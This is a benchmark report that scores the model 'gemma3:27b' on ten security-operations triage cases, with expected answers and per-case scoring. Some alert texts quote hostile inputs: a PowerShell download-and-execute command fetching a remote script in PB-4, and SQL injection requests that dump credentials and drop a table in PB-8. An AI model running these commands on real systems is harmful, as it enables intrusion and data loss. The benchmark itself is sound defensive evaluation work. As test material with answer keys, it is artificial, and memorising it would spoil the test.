# Playbook benchmark — `gemma3:27b`

Model: `gemma3:27b`  
Mode: **describe-only**  
Run started: 2026-05-06 02:35:54  
Cases: 10  
Format failures: 0  

## Summary

| Metric | Score |
|---|---|
| Composite context-understanding score | **90%** |
| Verdict accuracy | 10/10 (100%) |
| Severity accuracy | 8/10 (80%) |
| MITRE accuracy | 7/10 (70%) |
| Tool-selection accuracy | 10/10 (100%) |
| Format failures | 0/10 |
| Forbidden tool calls (e.g. auto-isolate on benign) | 0 |
| Not-found tool responses (hallucinated entities) | 0 |
| p50 latency | 5.2 s |
| p95 latency | 5.8 s |

## Per-case results

| Case | Expected | Verdict | Severity | MITRE | Tools | Latency |
|---|---|---|---|---|---|---|
| PB-1 | beni | PASS | PASS | PASS | PASS | 12.0s |
| PB-2 | inci | PASS | PASS | PASS | PASS | 4.8s |
| PB-3 | inci | PASS | PASS | PASS | PASS | 5.3s |
| PB-4 | inci | PASS | PASS | PASS | PASS | 4.6s |
| PB-5 | inci | PASS | PASS | FAIL | PASS | 5.2s |
| PB-6 | inci | PASS | FAIL | FAIL | PASS | 5.2s |
| PB-7 | beni | PASS | PASS | PASS | PASS | 3.2s |
| PB-8 | inci | PASS | PASS | PASS | PASS | 5.8s |
| PB-9 | inci | PASS | PASS | FAIL | PASS | 4.9s |
| PB-10 | inci | PASS | FAIL | PASS | PASS | 5.2s |

## Per-case detail

### PB-1 — expected: **benign** (severity ['info', 'low'], MITRE n/a)

_Alert_: Single-event alert: user `alice` (laptop 10.0.4.22) authenticated to the corporate intranet at 09:02 local time on a workday and opened her email. No prior failed attempts. Source matches her usual IP range.

_Latency_: 12.03s · GPU 100%/20532MB · CPU 52% · RAM 33617MB

_Tool calls_:
```
- cmdb.get_asset(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "benign",
  "severity": "info",
  "mitre": [],
  "tools_used": [
    "cmdb.get_asset"
  ],
  "rationale": "Routine user authentication and email access from a known IP range. CMDB lookup of 10.0.4.22 would confirm expected asset details, but is not necessary given the lack of anomalies."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['cmdb.get_asset'])

### PB-2 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1078', 'T1078.002', 'T1021', 'T1021.001'])

_Alert_: Domain admin account `dom_admin_01` authenticated successfully from external IP 41.78.122.18 at 03:14 UTC. Within 4 minutes the same account opened 18 RDP sessions to internal hosts (DC01, FILER-02, FINANCE-DB, ENG-FILE, BACKUP-01, …).

_Latency_: 4.76s · GPU 94%/20532MB · CPU 15% · RAM 33689MB

_Tool calls_:
```
- threat_intel.lookup_ip(null) -> (described-only)
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1078.002",
    "T1190"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "External IP 41.78.122.18 is likely malicious (needs threat intel lookup); a domain admin account opening 18 RDP sessions to multiple internal hosts within 4 minutes is highly anomalous and suggests potential reconnaissance or lateral movement. SIEM query would confirm if this is a normal pattern for this account."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['threat_intel.lookup_ip', 'siem.query_logs'])

### PB-3 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1110.003', 'T1110.004'])

_Alert_: Web server `webhost` (10.0.4.10): 50,000 POST requests to /wp-login.php from 1,200 distinct IPs within 10 minutes, including 3 successful logins to admin accounts. Sample source IP: 89.248.165.74.

_Latency_: 5.30s · GPU 94%/20532MB · CPU 13% · RAM 33708MB

_Tool calls_:
```
- threat_intel.lookup_ip(null) -> (described-only)
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1110.003",
    "T1078.002"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "High volume of POST requests to wp-login.php, combined with successful logins to admin accounts, indicates a likely brute-force attack. Threat intel lookup on 89.248.165.74 will confirm if it's a known malicious actor. CMDB lookup on 10.0.4.10 will reveal asset criticality. SIEM query for related login attempts will confirm scope."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['threat_intel.lookup_ip', 'siem.query_logs'])

### PB-4 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1059.001', 'T1059', 'T1566.001', 'T1204', 'T1204.002'])

_Alert_: EDR alert on host WIN-DEV-04: `winword.exe` spawned `powershell.exe` which executed `IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.15/a.ps1')`. User: dave.

_Latency_: 4.64s · GPU 94%/20532MB · CPU 22% · RAM 33614MB

_Tool calls_:
```
- threat_intel.lookup_ip(null) -> (described-only)
- cmdb.get_asset(null) -> (described-only)
- edr.get_processes(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1204.002",
    "T1105",
    "T1059.001"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "edr.get_processes"
  ],
  "rationale": "The process chain winword->powershell->download-and-execute is a strong indicator of compromise. Threat intel lookup on 185.220.101.15 is likely to reveal malicious content. EDR process tree confirms the execution flow."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['edr.get_processes', 'threat_intel.lookup_ip'])

### PB-5 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1071.004', 'T1071', 'T1048.003', 'T1048'])

_Alert_: DNS server logs show internal host 10.0.4.55 issuing 4,000+ unique subdomain queries against `cdn-update.xyz` over 2 hours, with TXT-record responses averaging 200 bytes.

_Latency_: 5.22s · GPU 94%/20532MB · CPU 34% · RAM 33597MB

_Tool calls_:
```
- threat_intel.lookup_domain(null) -> (described-only)
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1568",
    "T1071.003"
  ],
  "tools_used": [
    "threat_intel.lookup_domain",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "High volume of unique subdomain requests (4000+) to an external domain (cdn-update.xyz) from an internal host (10.0.4.55) suggests data exfiltration via DNS tunneling (T1568). TXT record size (200 bytes) supports this. SIEM query for 10.0.4.55 will confirm scope and identify other potentially compromised hosts."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=PASS (matched: ['threat_intel.lookup_domain', 'cmdb.get_asset'])

### PB-6 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1078'])

_Alert_: sshd on host `webhost` (10.0.4.10) recorded 7 failed password attempts for distinct usernames (admin, root, oracle, postgres, git, test, ubuntu) from source IP 185.220.101.45 between 03:41:02 and 03:41:20, followed by a successful login as `ubuntu` from the same IP at 03:43:21.

_Latency_: 5.17s · GPU 91%/20532MB · CPU 28% · RAM 33659MB

_Tool calls_:
```
- threat_intel.lookup_ip(null) -> (described-only)
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "medium",
  "mitre": [
    "T1110.003"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "Multiple failed SSH logins followed by a successful login from 185.220.101.45 is a brute-force attempt. Threat intel lookup on the IP will confirm if it's a known attacker. CMDB lookup on 10.0.4.10 will reveal asset criticality. SIEM query for further activity from 185.220.101.45 will confirm scope."
}
```

_Scoring_: verdict=PASS severity=FAIL mitre=FAIL tools=PASS (matched: ['threat_intel.lookup_ip', 'cmdb.get_asset'])

### PB-7 — expected: **benign** (severity ['info', 'low'], MITRE n/a)

_Alert_: Routine sshd event on `webhost` (10.0.4.10): publickey login accepted for `alice` from 10.0.4.22 at 09:14:32. PAM session opened. systemd-logind started session 2841.

_Latency_: 3.20s · GPU 89%/20532MB · CPU 38% · RAM 33651MB

_Tool calls_:
```
- cmdb.get_asset(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "benign",
  "severity": "info",
  "mitre": [],
  "tools_used": [
    "cmdb.get_asset"
  ],
  "rationale": "Routine SSH login from an internal IP to an internal host. cmdb.get_asset called to determine asset criticality, but no indicators of compromise are present in the alert text."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['cmdb.get_asset'])

### PB-8 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1190'])

_Alert_: Apache access log on `webhost` (10.0.4.10) shows 4 requests from 185.62.190.13 within 4 seconds: `GET /products.php?id=1' OR '1'='1--`, `GET /products.php?id=1+UNION+SELECT+username,password+FROM+users--`, `GET /products.php?id=1;DROP+TABLE+users--`, `GET /products.php?id=1+AND+SLEEP(5)--`. The UNION SELECT request returned a 200 with a 4129-byte body.

_Latency_: 5.77s · GPU 94%/20534MB · CPU 14% · RAM 33676MB

_Tool calls_:
```
- threat_intel.lookup_ip(null) -> (described-only)
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "high",
  "mitre": [
    "T1190",
    "T1561"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "The alert shows clear SQL injection attempts (UNION SELECT, DROP TABLE) from external IP 185.62.190.13. A 200 response to a UNION SELECT query with a body suggests successful exploitation. I would call threat_intel.lookup_ip on 185.62.190.13, cmdb.get_asset on 10.0.4.10, and siem.query_logs to confirm if this IP is scanning other hosts or if there's related activity."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=PASS tools=PASS (matched: ['threat_intel.lookup_ip', 'cmdb.get_asset'])

### PB-9 — expected: **incident** (severity ['medium', 'high'], MITRE ['T1098', 'T1548', 'T1136', 'T1078'])

_Alert_: On host `webhost` at 03:17:42, user `bob` (TTY pts/3) ran `sudo /usr/sbin/usermod -aG sudo svc_backup`. The change was applied (`add 'svc_backup' to group 'sudo'`). bob is a developer account with sudo rights but no documented need to modify service-account permissions at 03:17.

_Latency_: 4.90s · GPU 94%/20534MB · CPU 9% · RAM 33664MB

_Tool calls_:
```
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
- edr.get_processes(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "medium",
  "mitre": [
    "T1548.002"
  ],
  "tools_used": [
    "cmdb.get_asset",
    "siem.query_logs",
    "edr.get_processes"
  ],
  "rationale": "An internal user (bob) elevated privileges on a host (webhost) by adding a service account (svc_backup) to the sudo group. cmdb.get_asset will confirm webhost's criticality and tags. siem.query_logs will check for similar activity or bob's typical behavior. edr.get_processes will show the process tree to confirm the command's origin."
}
```

_Scoring_: verdict=PASS severity=PASS mitre=FAIL tools=PASS (matched: ['cmdb.get_asset', 'edr.get_processes'])

### PB-10 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1110.003', 'T1078', 'T1078.002'])

_Alert_: Domain controller DC01: 5 sequential EventID 4625 (BadPassword) events for account `Administrator`, LogonType 3, source IP 192.168.50.13 (workstation KIOSK-04) between 02:18:14 and 02:18:24, followed by an EventID 4624 (success) for the same account from the same IP at 02:21:42.

_Latency_: 5.25s · GPU 94%/20534MB · CPU 12% · RAM 33696MB

_Tool calls_:
```
- threat_intel.lookup_ip(null) -> (described-only)
- cmdb.get_asset(null) -> (described-only)
- siem.query_logs(null) -> (described-only)
```

_Parsed answer_:
```json
{
  "verdict": "incident",
  "severity": "medium",
  "mitre": [
    "T1110.003"
  ],
  "tools_used": [
    "threat_intel.lookup_ip",
    "cmdb.get_asset",
    "siem.query_logs"
  ],
  "rationale": "Sequential bad password attempts followed by a successful logon is indicative of password spraying (T1110.003). While the source IP is internal, the rapid sequence of failures warrants investigation. I would use threat_intel to check the reputation of 192.168.50.13, cmdb to get asset details for KIOSK-04, and siem to check for similar events from other accounts or IPs."
}
```

_Scoring_: verdict=PASS severity=FAIL mitre=PASS tools=PASS (matched: ['cmdb.get_asset', 'siem.query_logs'])
